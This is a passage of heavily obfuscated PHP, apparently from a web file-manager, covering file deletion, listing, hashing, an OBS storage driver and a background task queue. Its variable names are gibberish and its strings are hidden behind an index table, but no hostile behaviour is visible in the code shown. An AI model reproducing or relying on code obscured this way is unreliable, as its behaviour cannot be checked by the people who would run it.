$ıÛ‘í“€[1459], !0); return !1; } public function delFile($•ÆˆøÁê) { $•ÆˆøÁê = $this->iconvSystem($•ÆˆøÁê); if (!@unlink($•ÆˆøÁê)) { @chmod($•ÆˆøÁê, $this->pathAuth); if (@unlink($•ÆˆøÁê)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][1459], !0); return !1; } return !0; } public function delFolder($’—Ú ÔÂ) { $…«İ“õ =& $_SERVER[÷ôÚîå]; $’—Ú ÔÂ = $this->iconvSystem($’—Ú ÔÂ); if (!is_dir($’—Ú ÔÂ)) { return !0; } if (!($¶­¯úáñ = opendir($’—Ú ÔÂ))) { return !1; } while (($ú×Äİş‡ = readdir($¶­¯úáñ)) !== !1) { if ($ú×Äİş‡ == $…«İ“õ[10] || $ú×Äİş‡ == $…«İ“õ[1374]) { continue; } $¬îÔµÄŸ = $’—Ú ÔÂ . $…«İ“õ[8] . $ú×Äİş‡; if (is_file($¬îÔµÄŸ) || is_link($¬îÔµÄŸ)) { if (!unlink($¬îÔµÄŸ)) { chmod($¬îÔµÄŸ, $this->pathAuth); if (!unlink($¬îÔµÄŸ)) { return !1; } } } else { if (is_dir($¬îÔµÄŸ)) { chmod($¬îÔµÄŸ, $this->pathAuth); $¬îÔµÄŸ = $this->iconvApp($¬îÔµÄŸ); if (!$this->delFolder($¬îÔµÄŸ)) { return !1; } } } } closedir($¶­¯úáñ); return rmdir($’—Ú ÔÂ); } public function rename($‡°ô¥Ï, $˜ûôàßø) { $º»ƒµÀë =& $_SERVER[÷ôÚîå]; $òñ¯×ÖÏ = $this->fileNameAuto($this->pathFather($‡°ô¥Ï), $˜ûôàßø); $òñ¯×ÖÏ = $this->iconvSystem($òñ¯×ÖÏ); $‡°ô¥Ï = $this->iconvSystem($‡°ô¥Ï); $œÑ¸ùãï = $this->pathFather($‡°ô¥Ï); $ôØ“ÔÙÁ = rtrim($œÑ¸ùãï, $º»ƒµÀë[8]) . $º»ƒµÀë[8] . $òñ¯×ÖÏ; $Œ°˜¬ÌÅ = @rename($‡°ô¥Ï, $ôØ“ÔÙÁ); $ôØ“ÔÙÁ = $this->iconvApp($ôØ“ÔÙÁ); if ($Œ°˜¬ÌÅ) { return $this->getPathOuter($ôØ“ÔÙÁ); } $this->writeLog(__FUNCTION__ . $º»ƒµÀë[1459], !0); return !1; } public function size($Œ·¼¬ş) { $Œ·¼¬ş = $this->iconvSystem($Œ·¼¬ş); return filesize_64($Œ·¼¬ş); } public function info($ãéè¨æ) { $ãéè¨æ = $this->iconvSystem($ãéè¨æ); if ($this->isFolder($ãéè¨æ)) { return $this->folderInfo($ãéè¨æ); } else { if ($this->isFile($ãéè¨æ)) { return $this->fileInfo($ãéè¨æ); } } return !1; } protected function infoChildren($´”Óì¢, &$Ü–÷±£, $Ó—·Šé† = true) { $ãó€÷Ö‚ =& $_SERVER[÷ôÚîå]; check_abort_echo(); $´”Óì¢ = rtrim($´”Óì¢, $ãó€÷Ö‚[8]) . $ãó€÷Ö‚[8]; if ($Ó—·Šé†) { $´”Óì¢ = $this->iconvSystem($´”Óì¢); } if (!($ÑğÃš¼æ = @opendir($´”Óì¢))) { return; } while (($ı¤‘–ñ® = readdir($ÑğÃš¼æ)) !== !1) { if ($ı¤‘–ñ® == $ãó€÷Ö‚[10] || $ı¤‘–ñ® == $ãó€÷Ö‚[1374]) { continue; } $šâòÓĞà = $´”Óì¢ . $ı¤‘–ñ®; if (is_file($šâòÓĞà) || is_link($šâòÓĞà)) { $Ü–÷±£[$ãó€÷Ö‚[90]]++; $Ü–÷±£[$ãó€÷Ö‚[89]] += filesize_64($šâòÓĞà); } else { if (is_dir($šâòÓĞà)) { $Ü–÷±£[$ãó€÷Ö‚[91]]++; $this->infoChildren($šâòÓĞà, $Ü–÷±£, !1); } } } closedir($ÑğÃš¼æ); } private function folderInfo($¿Â²–­¥, $äû‘¥†ã = false) { $ÂËƒ÷¾¿ =& $_SERVER[÷ôÚîå]; $¿Â²–­¥ = rtrim($¿Â²–­¥, $ÂËƒ÷¾¿[8]) . $ÂËƒ÷¾¿[8]; $áÀ«Ã»â = $this->iconvApp($this->pathThis($¿Â²–­¥)); if ($äû‘¥†ã) { return array($ÂËƒ÷¾¿[32] => $áÀ«Ã»â, $ÂËƒ÷¾¿[97] => $this->getPathOuter($¿Â²–­¥), $ÂËƒ÷¾¿[33] => $ÂËƒ÷¾¿[88]); } $ÇîëŞáÆ = array($ÂËƒ÷¾¿[32] => $áÀ«Ã»â, $ÂËƒ÷¾¿[97] => $this->getPathOuter($¿Â²–­¥), $ÂËƒ÷¾¿[33] => $ÂËƒ÷¾¿[88], $ÂËƒ÷¾¿[241] => @filectime($¿Â²–­¥), $ÂËƒ÷¾¿[98] => @filemtime($¿Â²–­¥), $ÂËƒ÷¾¿[1463] => @fileatime($¿Â²–­¥), $ÂËƒ÷¾¿[1464] => is_readable($¿Â²–­¥), $ÂËƒ÷¾¿[1465] => is_writable($¿Â²–­¥), $ÂËƒ÷¾¿[1466] => get_mode($¿Â²–­¥)); return $ÇîëŞáÆ; } private function fileInfo($ÉåÓ°Ø, $é™šÕ²É = false) { $²Ø—Ïô =& $_SERVER[÷ôÚîå]; $´äé‚ = $this->iconvApp($this->pathThis($ÉåÓ°Ø)); if ($é™šÕ²É) { return array($²Ø—Ïô[32] => $´äé‚, $²Ø—Ïô[97] => $this->getPathOuter($ÉåÓ°Ø), $²Ø—Ïô[33] => $²Ø—Ïô[240], $²Ø—Ïô[89] => $this->size($ÉåÓ°Ø), $²Ø—Ïô[179] => $this->ext($´äé‚)); } $ï¯İÖ»» = array($²Ø—Ïô[32] => $´äé‚, $²Ø—Ïô[97] => $this->getPathOuter($ÉåÓ°Ø), $²Ø—Ïô[33] => $²Ø—Ïô[240], $²Ø—Ïô[241] => @filectime($ÉåÓ°Ø), $²Ø—Ïô[98] => @filemtime($ÉåÓ°Ø), $²Ø—Ïô[1463] => @fileatime($ÉåÓ°Ø), $²Ø—Ïô[89] => $this->size($ÉåÓ°Ø), $²Ø—Ïô[179] => $this->ext($´äé‚), $²Ø—Ïô[1464] => is_readable($ÉåÓ°Ø), $²Ø—Ïô[1465] => is_writable($ÉåÓ°Ø), $²Ø—Ïô[1466] => get_mode($ÉåÓ°Ø)); return $ï¯İÖ»»; } public function exist($ÒÛÃßáÚ) { $ÒÛÃßáÚ = $this->iconvSystem($ÒÛÃßáÚ); return @file_exists($ÒÛÃßáÚ); } public function isFile($»Û»£€Ã) { $»Û»£€Ã = $this->iconvSystem($»Û»£€Ã); return @is_file($»Û»£€Ã); } public function isFolder($óêÔˆ‹Õ) { $óêÔˆ‹Õ = $this->iconvSystem($óêÔˆ‹Õ); return @is_dir($óêÔˆ‹Õ); } public function listPath($İŞõ¤à, $¹Ã½¿Ä† = false) { $³¶ÁÕ­‹ =& $_SERVER[÷ôÚîå]; $İŞõ¤à = $this->iconvSystem($İŞõ¤à); $İŞõ¤à = rtrim($İŞõ¤à, $³¶ÁÕ­‹[8]) . $³¶ÁÕ­‹[8]; $ºÙ’ï» = array($³¶ÁÕ­‹[95] => array(), $³¶ÁÕ­‹[96] => array()); if (!($´õ¸æÂš = @opendir($İŞõ¤à))) { return $ºÙ’ï»; } while (($½ÆÂ×àÑ = readdir($´õ¸æÂš)) !== !1) { if ($½ÆÂ×àÑ == $³¶ÁÕ­‹[10] || $½ÆÂ×àÑ == $³¶ÁÕ­‹[1374]) { continue; } $ÎØ‰í © = $İŞõ¤à . $½ÆÂ×àÑ; if (is_file($ÎØ‰í ©)) { $ºÙ’ï»[$³¶ÁÕ­‹[96]][] = $this->fileInfo($ÎØ‰í ©, $¹Ã½¿Ä†); } else { $ºÙ’ï»[$³¶ÁÕ­‹[95]][] = $this->folderInfo($ÎØ‰í ©, $¹Ã½¿Ä†); } } closedir($´õ¸æÂš); return $ºÙ’ï»; } public function listAll($¢ŒÛ¢”ó, &$ÈÑİÊ×ù = array()) { $¤ã–É¶ =& $_SERVER[÷ôÚîå]; $¢ŒÛ¢”ó = $this->iconvSystem($¢ŒÛ¢”ó); $¢ŒÛ¢”ó = rtrim($¢ŒÛ¢”ó, $¤ã–É¶[8]) . $¤ã–É¶[8]; if (!($¬Ëó¼Øƒ = @opendir($¢ŒÛ¢”ó))) { return $ÈÑİÊ×ù; } while (($èÎ·¾Šî = readdir($¬Ëó¼Øƒ)) !== !1) { if ($èÎ·¾Šî == $¤ã–É¶[10] || $èÎ·¾Šî == $¤ã–É¶[1374]) { continue; } $¨µ¸š–ä = $¢ŒÛ¢”ó . $èÎ·¾Šî; $­¦»½æ = is_dir($¨µ¸š–ä) && !is_link($¨µ¸š–ä) ? 1 : 0; $¨µ¸š–ä = $­¦»½æ ? $¨µ¸š–ä . $¤ã–É¶[8] : $¨µ¸š–ä; $ÈÑİÊ×ù[] = array($¤ã–É¶[97] => $¨µ¸š–ä, $¤ã–É¶[88] => $­¦»½æ, $¤ã–É¶[98] => intval(@filemtime($¨µ¸š–ä)), $¤ã–É¶[89] => $­¦»½æ ? 0 : intval($this->size($¨µ¸š–ä))); if ($­¦»½æ) { $this->listAll($¨µ¸š–ä, $ÈÑİÊ×ù); } } closedir($¬Ëó¼Øƒ); return $ÈÑİÊ×ù; } public function has($¤Ùğƒ®Ø, $ Ø‘ğÒÏ = false, $«·Ã³›Û = true) { $‰¬÷“éª =& $_SERVER[÷ôÚîå]; $¤Ùğƒ®Ø = $this->iconvSystem($¤Ùğƒ®Ø); $¤Ùğƒ®Ø = rtrim($¤Ùğƒ®Ø, $‰¬÷“éª[8]) . $‰¬÷“éª[8]; if (!($‰—Ëçé‘ = @opendir($¤Ùğƒ®Ø))) { return !1; } $Ä¡Í„àÔ = 0; $æ‘øÎò¦ = 0; $éĞë·Äğ = 0; while (($ªéˆÆ†œ = readdir($‰—Ëçé‘)) !== !1) { if ($ªéˆÆ†œ == $‰¬÷“éª[10] || $ªéˆÆ†œ == $‰¬÷“éª[1374]) { continue; } $Á·²®Ü‰ = $¤Ùğƒ®Ø . $ªéˆÆ†œ; if ($ Ø‘ğÒÏ) { $éĞë·Äğ++; if (@is_file($Á·²®Ü‰)) { $Ä¡Í„àÔ++; } else { $æ‘øÎò¦++; } if ($éĞë·Äğ > 10000) { break; } continue; } if ($«·Ã³›Û) { if (@is_file($Á·²®Ü‰)) { return !0; } } else { if (@is_dir($Á·²®Ü‰ . $‰¬÷“éª[8])) { return !0; } } } closedir($‰—Ëçé‘); if ($ Ø‘ğÒÏ) { return array($‰¬÷“éª[249] => $Ä¡Í„àÔ, $‰¬÷“éª[250] => $æ‘øÎò¦); } return !1; } public function hashSimple($´…ôÓ“) { $µÁ‡Á—© =& $_SERVER[÷ôÚîå]; if (!$´…ôÓ“) { return md5($µÁ‡Á—©[12]); } $´…ôÓ“ = $this->iconvSystem($´…ôÓ“); $¯¦¥İÕ„ = $this->size($´…ôÓ“); $ñˆ¨‹ = 200; $»»€æœı = 50; if ($¯¦¥İÕ„ <= $ñˆ¨‹ * $»»€æœı) { return $this->hashMd5($´…ôÓ“) . $¯¦¥İÕ„; } $ñĞ÷Å²Ó = $µÁ‡Á—©[12]; $ŠË¯œ»§ = intval($¯¦¥İÕ„ / $»»€æœı); $®¯óşâÆ = fopen($´…ôÓ“, $µÁ‡Á—©[1467]); if (!$®¯óşâÆ) { return $ñĞ÷Å²Ó; } for ($š°¬ã«¨ = 0; $š°¬ã«¨ < $»»€æœı; $š°¬ã«¨++) { fseek_64($®¯óşâÆ, $ŠË¯œ»§ * $š°¬ã«¨); $ñĞ÷Å²Ó .= fread($®¯óşâÆ, $ñˆ¨‹); } fseek_64($®¯óşâÆ, $¯¦¥İÕ„ - $ñˆ¨‹); $ñĞ÷Å²Ó .= fread($®¯óşâÆ, $ñˆ¨‹); fclose($®¯óşâÆ); return md5($ñĞ÷Å²Ó) . $¯¦¥İÕ„; } public function getContent($›©Ÿ½Ó·) { $›©Ÿ½Ó· = $this->iconvSystem($›©Ÿ½Ó·); return file_get_contents($›©Ÿ½Ó·); } public function setContent($âÆš§óÂ, $¥“‡îÖ = '') { $âÆš§óÂ = $this->iconvSystem($âÆš§óÂ); $ÙôËòƒô = @file_put_contents($âÆš§óÂ, $¥“‡îÖ, LOCK_EX); if (!$ÙôËòƒô) { $this->writeLog(__FUNCTION__ . $_SERVER[÷ôÚîå][1459], !0); } clearstatcache(); @chmod($âÆš§óÂ, $this->pathAuth); return $ÙôËòƒô === !1 ? !1 : !0; } public function fileSubstr($şœ¦ã”—, $Ö™òûñ¶ = 0, $ã‚ô‰İ» = false) { $“³ã¢Æ =& $_SERVER[÷ôÚîå]; $şœ¦ã”— = $this->iconvSystem($şœ¦ã”—); if ($ã‚ô‰İ» === !1) { $ã‚ô‰İ» = $this->size($şœ¦ã”—); } if ($ã‚ô‰İ» <= 0) { return $“³ã¢Æ[12]; } $ÉŸÁ›ğ = fopen($şœ¦ã”—, $“³ã¢Æ[1467]); if (!$ÉŸÁ›ğ) { return !1; } fseek_64($ÉŸÁ›ğ, $Ö™òûñ¶); $Ì¶Ä†´² = fread($ÉŸÁ›ğ, $ã‚ô‰İ»); fclose($ÉŸÁ›ğ); if (!$Ì¶Ä†´²) { $this->writeLog(__FUNCTION__ . $“³ã¢Æ[1459], !0); } return $Ì¶Ä†´²; } public function upload($¸¡²ÚÂğ, $¡€¾§İ¡, $Ï¼ÑÃœŒ = false, $Û·ôØÎ = REPEAT_REPLACE) { if ($Ï¼ÑÃœŒ) { return $this->moveFile($¡€¾§İ¡, $¸¡²ÚÂğ); } return $this->copyFile($¡€¾§İ¡, $¸¡²ÚÂğ); } public function setModifyTime($êÊ„ì£, $ÅùÜ´‹Ñ = '') { @touch($êÊ„ì£, intval($ÅùÜ´‹Ñ)); } public function download($—çšÙÁ·, $ª¯Ñâï«) { return $this->iconvSystem($—çšÙÁ·); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($î½ä„Æ™) { parent::__construct($î½ä„Æ™); $this->setSignVersion($_SERVER[÷ôÚîå][257]); } public function fileOutImage($°•Û¶®, $ºõõíè = 250) { $—ŒĞ¥“” =& $_SERVER[÷ôÚîå]; if ($this->size($°•Û¶®) > 1024 * 1024 * 25) { return $this->fileOutImageServer($°•Û¶®, $ºõõíè); } $ïĞî¼Î¤ = array($—ŒĞ¥“”[1468] => $—ŒĞ¥“”[1469] . $ºõõíè . $—ŒĞ¥“”[1470]); $ÛÑ»Ñ› = $this->link($°•Û¶®, $ïĞî¼Î¤); $this->fileOutLink($ÛÑ»Ñ›); } public function fileOutLink($±½èÈÁ) { $Á—õõñ¯ =& $_SERVER[÷ôÚîå]; if (substr($±½èÈÁ, 0, 7) == $Á—õõñ¯[322]) { $±½èÈÁ = $Á—õõñ¯[323] . substr($±½èÈÁ, 7); } header($Á—õõñ¯[185] . $±½èÈÁ); die; } } goto aÈÉÄù•™œ; cƒ¾ŠŞÇÜ: class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($´¯á¦·®, $Ú£¸Á÷– = '', $í¸“‰Æé = 0, $€ºòêë = '') { $çÎÖ°İ =& $_SERVER[÷ôÚîå]; $€ºòêë = $€ºòêë ? $€ºòêë : ($Ú£¸Á÷– ? $Ú£¸Á÷– : $´¯á¦·®); $Šù®‹æÌ = new Task($´¯á¦·®, $Ú£¸Á÷–, $í¸“‰Æé, $€ºòêë); $GLOBALS[$çÎÖ°İ[1862] . $´¯á¦·®] = new TaskLog($çÎÖ°İ[1763], $Šù®‹æÌ, $€ºòêë); return $Šù®‹æÌ; } public function __construct($ÅÂã®Øˆ = '', $Êß„Ş­Ş = '', $Î –Íæ = '') { $óâè©Ë =& $_SERVER[÷ôÚîå]; if (!$ÅÂã®Øˆ) { $ÅÂã®Øˆ = $óâè©Ë[1763]; } $Ùõ³ôÜ = $ÅÂã®Øˆ . $óâè©Ë[471] . rand_string(10); if (!$Î –Íæ) { $Î –Íæ = $ÅÂã®Øˆ . $óâè©Ë[53] . $Î –Íæ; } switch ($ÅÂã®Øˆ) { case $óâè©Ë[1763]: if (!$Êß„Ş­Ş || !$Êß„Ş­Ş->task) { return echoLog($ÅÂã®Øˆ . $óâè©Ë[1863]); } $“öÉˆ—Ö = $Êß„Ş­Ş; $Ùõ³ôÜ = $“öÉˆ—Ö->task[$óâè©Ë[484]]; $ÅÂã®Øˆ = $“öÉˆ—Ö->task[$óâè©Ë[484]]; if (!$“öÉˆ—Ö->task[$óâè©Ë[1668]]) { $“öÉˆ—Ö->task[$óâè©Ë[1668]] = $Î –Íæ ? $Î –Íæ : $ÅÂã®Øˆ; } break; case $óâè©Ë[1864]: if (!$Êß„Ş­Ş) { return echoLog($ÅÂã®Øˆ . $óâè©Ë[1865]); } $¨‡µ¨’İ = is_string($Êß„Ş­Ş) ? array($Êß„Ş­Ş) : $Êß„Ş­Ş; $“öÉˆ—Ö = new TaskFileTransfer($Ùõ³ôÜ, $ÅÂã®Øˆ, 0, $Î –Íæ ? $Î –Íæ : $¨‡µ¨’İ[0]); foreach ($¨‡µ¨’İ as $šôÀšæ) { $“öÉˆ—Ö->addPath($šôÀšæ); } break; case $óâè©Ë[398]: if (!$Êß„Ş­Ş) { return echoLog($ÅÂã®Øˆ . $óâè©Ë[1865]); } $¨‡µ¨’İ = is_string($Êß„Ş­Ş) ? array($Êß„Ş­Ş) : $Êß„Ş­Ş; $“öÉˆ—Ö = new TaskZip($Ùõ³ôÜ, $ÅÂã®Øˆ, 0, $Î –Íæ ? $Î –Íæ : $¨‡µ¨’İ[0]); foreach ($¨‡µ¨’İ as $šôÀšæ) { $“öÉˆ—Ö->addPath($šôÀšæ); } break; case $óâè©Ë[1310]: if (!$Êß„Ş­Ş) { return echoLog($ÅÂã®Øˆ . $óâè©Ë[1865]); } $“öÉˆ—Ö = new TaskUnZip($Ùõ³ôÜ, $ÅÂã®Øˆ, 0, $Î –Íæ ? $Î –Íæ : $Êß„Ş­Ş); if ($Êß„Ş­Ş) { $“öÉˆ—Ö->addFile($Êß„Ş­Ş); } break; case $óâè©Ë[162]: $“öÉˆ—Ö = new TaskHttp($Ùõ³ôÜ, $ÅÂã®Øˆ); break; default: return; break; } $this->task = $“öÉˆ—Ö; $this->taskID = $Ùõ³ôÜ; Hook::bind($óâè©Ë[1800], array($this, $óâè©Ë[1866])); Hook::bind($óâè©Ë[1802], array($this, $óâè©Ë[1867])); Hook::bind($óâè©Ë[1796], array($this, $óâè©Ë[1868])); echoLog($óâè©Ë[1869] . $“öÉˆ—Ö->task[$óâè©Ë[1668]]); } public function __destruct() { $this->end(); } public function end($çĞ“Í£¯ = '') { $¡ÒåÌ¸¨ =& $_SERVER[÷ôÚîå]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($çĞ“Í£¯); $this->task = !1; $this->taskID = !1; Hook::unbind($¡ÒåÌ¸¨[1800], array($this, $¡ÒåÌ¸¨[1866])); Hook::unbind($¡ÒåÌ¸¨[1802], array($this, $¡ÒåÌ¸¨[1867])); Hook::unbind($¡ÒåÌ¸¨[1796], array($this, $¡ÒåÌ¸¨[1868])); } public function taskUpdate($ÅØÇ ğË) { $åªË´˜š =& $_SERVER[÷ôÚîå]; if (!$ÅØÇ ğË || $this->taskID != $ÅØÇ ğË[$åªË´˜š[484]]) { return; } $¾©³³Ñ½ = 20; $¿ŸÀ˜¡Ù = intval($ÅØÇ ğË[$åªË´˜š[1781]] * $¾©³³Ñ½); $Şåˆ€¤ñ = $åªË´˜š[186] . str_repeat($åªË´˜š[973], $¿ŸÀ˜¡Ù) . $åªË´˜š[1103] . str_repeat($åªË´˜š[53], $¾©³³Ñ½ - $¿ŸÀ˜¡Ù) . $åªË´˜š[188]; $½¥–İìŠ = $Şåˆ€¤ñ . sprintf($åªË´˜š[1870], $ÅØÇ ğË[$åªË´˜š[1781]] * 100) . $åªË´˜š[1871]; $ÛéşóËš = $½¥–İìŠ . $ÅØÇ ğË[$åªË´˜š[1780]] . $åªË´˜š[8] . $ÅØÇ ğË[$åªË´˜š[1152]] . LNG($åªË´˜š[1872]); $§Áô‘Ò = $åªË´˜š[12]; if ($ÅØÇ ğË[$åªË´˜š[1856]]) { $ÛéşóËš = $½¥–İìŠ . size_format($ÅØÇ ğË[$åªË´˜š[1780]]) . $åªË´˜š[8] . size_format($ÅØÇ ğË[$åªË´˜š[1152]]); $§Áô‘Ò = size_format($ÅØÇ ğË[$åªË´˜š[1782]]) . $åªË´˜š[1873]; } if ($ÅØÇ ğË[$åªË´˜š[1154]]) { $ÅØÇ ğË[$åªË´˜š[1830]] = $ÅØÇ ğË[$åªË´˜š[1154]] . $åªË´˜š[53] . $ÅØÇ ğË[$åªË´˜š[1830]]; } if ($ÅØÇ ğË[$åªË´˜š[1830]]) { $Ÿêõã†ƒ = $åªË´˜š[12]; if ($ÅØÇ ğË[$åªË´˜š[1832]]) { $Ÿêõã†ƒ = $åªË´˜š[50] . size_format($ÅØÇ ğË[$åªË´˜š[1833]]) . $åªË´˜š[8] . size_format($ÅØÇ ğË[$åªË´˜š[1832]]); } $§Áô‘Ò .= $ÅØÇ ğË[$åªË´˜š[1830]] . $Ÿêõã†ƒ; } if ($ÅØÇ ğË[$åªË´˜š[852]] && !$ÅØÇ ğË[$åªË´˜š[1832]]) { $§Áô‘Ò .= $åªË´˜š[53] . size_format($ÅØÇ ğË[$åªË´˜š[1837]]) . $åªË´˜š[8] . size_format($ÅØÇ ğË[$åªË´˜š[852]]); } echoLog($ÛéşóËš . $åªË´˜š[53] . $§Áô‘Ò, !0); } public function taskEnd($š¦‚¤ô‚) { $½‘·ÀÀä =& $_SERVER[÷ôÚîå]; if (!$š¦‚¤ô‚ || $this->taskID != $š¦‚¤ô‚[$½‘·ÀÀä[484]]) { return; } $úÆ¶íğ = $š¦‚¤ô‚ ? $š¦‚¤ô‚[$½‘·ÀÀä[1780]] . $½‘·ÀÀä[8] . $š¦‚¤ô‚[$½‘·ÀÀä[1152]] . LNG($½‘·ÀÀä[1872]) . $½‘·ÀÀä[84] : $½‘·ÀÀä[12]; echoLog($½‘·ÀÀä[1874] . $š¦‚¤ô‚[$½‘·ÀÀä[1668]] . ($š¦‚¤ô‚[$½‘·ÀÀä[535]] ? $½‘·ÀÀä[84] . $š¦‚¤ô‚[$½‘·ÀÀä[535]] : $½‘·ÀÀä[12]) . $½‘·ÀÀä[84] . $úÆ¶íğ . $½‘·ÀÀä[1875] . sprintf($½‘·ÀÀä[940], timeFloat() - $š¦‚¤ô‚[$½‘·ÀÀä[1783]]) . $½‘·ÀÀä[1795]); $this->end(); } public function taskKill($İ·ÔšÈŠ) { $£ÌÊÓ‘Í =& $_SERVER[÷ôÚîå]; if (!$İ·ÔšÈŠ || $this->taskID != $İ·ÔšÈŠ[$£ÌÊÓ‘Í[484]]) { return; } echoLog($£ÌÊÓ‘Í[1876] . $İ·ÔšÈŠ[$£ÌÊÓ‘Í[1668]]); } } class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\164\x61\163\x6b\121\165\145\165\x65\x4c\145\156\x67\164\150"; const QUEUE_DATA = "\x74\x61\x73\x6b\x51\165\x65\x75\x65\x44\141\164\141"; const QUEUE_TIME = "\x74\x61\163\x6b\121\x75\x65\x75\x65\x4c\x61\163\164\122\165\156"; const QUEUE_THREAD = "\x74\x61\x73\153\x51\165\145\165\145\x54\x68\162\x65\x61\144"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ó…Ü¥š , $êÙ‡· = array(), $ŞÚ“¯›ó = '', $©òå…¡¼ = '') { $Èç¹Œ’Ó =& $_SERVER[÷ôÚîå]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($©òå…¡¼ && array_find_by_field(self::$listData, $Èç¹Œ’Ó[107], $©òå…¡¼)) { return !0; } if ($©òå…¡¼ && array_find_by_field(self::$listDataAdd, $Èç¹Œ’Ó[107], $©òå…¡¼)) { return !0; } self::$listDataAdd[] = array($Èç¹Œ’Ó[350] => $ó…Ü¥š , $Èç¹Œ’Ó[1877] => $êÙ‡·, $Èç¹Œ’Ó[535] => $ŞÚ“¯›ó, $Èç¹Œ’Ó[107] => $©òå…¡¼); return !0; } public static function addSubmit() { $»¶³•°Ö =& $_SERVER[÷ôÚîå]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($»¶³•°Ö[1878] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $»¶³•°Ö[12], $»¶³•°Ö[535])), $»¶³•°Ö[207]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($ëêÅ½ßÊ, $Êõï”å‰ = array(), $İò©’ë = '', $ÙåÚò„É = '') { $÷òâ²Ä‘ =& $_SERVER[÷ôÚîå]; if (self::count() >= self::MAX_LENGTH) { return !1; } $·õ‚ã÷ = self::getAll(); if ($ÙåÚò„É && array_find_by_field($·õ‚ã÷, $÷òâ²Ä‘[107], $ÙåÚò„É)) { return !0; } $·õ‚ã÷[] = array($÷òâ²Ä‘[350] => $ëêÅ½ßÊ, $÷òâ²Ä‘[1877] => $Êõï”å‰, $÷òâ²Ä‘[535] => $İò©’ë, $÷òâ²Ä‘[107] => $ÙåÚò„É); self::setAll($·õ‚ã÷); write_log($÷òâ²Ä‘[1878] . $İò©’ë, $÷òâ²Ä‘[207]); return !0; } public static function run() { $”ÒêüÌñ =& $_SERVER[÷ôÚîå]; $“–ö÷á¢ = self::getAll(); $ƒãÕ¬å = array_shift($“–ö÷á¢); if (!$ƒãÕ¬å) { return !1; } self::setAll($“–ö÷á¢); $­•ĞÓªÁ = timeFloat(); $èŸıĞ› = $”ÒêüÌñ[12]; try { $èŸıĞ› = Hook::apply($ƒãÕ¬å[$”ÒêüÌñ[350]], $ƒãÕ¬å[$”ÒêüÌñ[1877]]); } catch (Exception $æ¼…ŠàŠ) { write_log($æ¼…ŠàŠ, $”ÒêüÌñ[1275]); } $«Í…‡Â = number_format(timeFloat() - $­•ĞÓªÁ, 3) . $”ÒêüÌñ[1795]; if ($èŸıĞ› && is_string($èŸıĞ›)) { $«Í…‡Â = $«Í…‡Â . $”ÒêüÌñ[1879] . $èŸıĞ›; } write_log($”ÒêüÌñ[1880] . $ƒãÕ¬å[$”ÒêüÌñ[535]] . $”ÒêüÌñ[1881] . $«Í…‡Â, $”ÒêüÌñ[207]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $õ»×ùºÅ =& $_SERVER[÷ôÚîå]; $¹ÁåÈ² = self::threadCount() + 1; if ($¹ÁåÈ² > 3 || !self::count()) { return; } write_log($õ»×ùºÅ[1882] . $¹ÁåÈ², $õ»×ùºÅ[207]); Cache::set(self::QUEUE_THREAD, $¹ÁåÈ², 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($õ»×ùºÅ[1883], $õ»×ùºÅ[207]); } public static function getKey($€£€îİİ, $Åæ¶ÚÇÌ = "\x69\x6e\164") { $½ÕÂÚ‡— =& $_SERVER[÷ôÚîå]; Cache::removeMemory($€£€îİİ); $ó¢¥Ñ¶ó = Cache::get($€£€îİİ); if ($Åæ¶ÚÇÌ == $½ÕÂÚ‡—[373]) { return $ó¢¥Ñ¶ó ? intval($ó¢¥Ñ¶ó) : 0; } if ($Åæ¶ÚÇÌ == $½ÕÂÚ‡—[1884]) { return is_array($ó¢¥Ñ¶ó) ? $ó¢¥Ñ¶ó : array(); } return $ó¢¥Ñ¶ó; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[÷ôÚîå][1884]); } public static function setAll($œ„ æ) { $ „¨êŸ“ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($œ„ æ), $ „¨êŸ“); Cache::set(self::QUEUE_DATA, $œ„ æ, $ „¨êŸ“); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ıı‰†Ä, $Šõ“¬ş‡ = 5.0) { if (!$ıı‰†Ä) { return; } $Æ¡‰ìšñ = Cache::get($ıı‰†Ä); if (!$Æ¡‰ìšñ || timeFloat() - floatVal($Æ¡‰ìšñ) >= $Šõ“¬ş‡) { Cache::set($ıı‰†Ä, timeFloat(), $Šõ“¬ş‡ * 10); return !0; } return !1; } public static function timeLimitCall($·’´ÛŒ¶, $Ç²§úé“, $¿æ¥Îåˆ, $Ûî’³Ìİ = 5.0) { $¦¾¾şà =& $_SERVER[÷ôÚîå]; if (!$·’´ÛŒ¶ || !$Ç²§úé“) { return; } self::$asyncAdd = !0; $ÍşÎß³ = $¦¾¾şà[1885]; $Ğ°ÙìÑô = Cache::get($ÍşÎß³, !0); $ş›Ë“÷‡ = array($¦¾¾şà[1886] => timeFloat(), $¦¾¾şà[1887] => timeFloat(), $¦¾¾şà[350] => $Ç²§úé“, $¦¾¾şà[1877] => $¿æ¥Îåˆ, $¦¾¾şà[216] => $Ûî’³Ìİ); if (is_array($Ğ°ÙìÑô[$·’´ÛŒ¶])) { $ş›Ë“÷‡[$¦¾¾şà[1887]] = $Ğ°ÙìÑô[$·’´ÛŒ¶][$¦¾¾şà[1887]]; } if 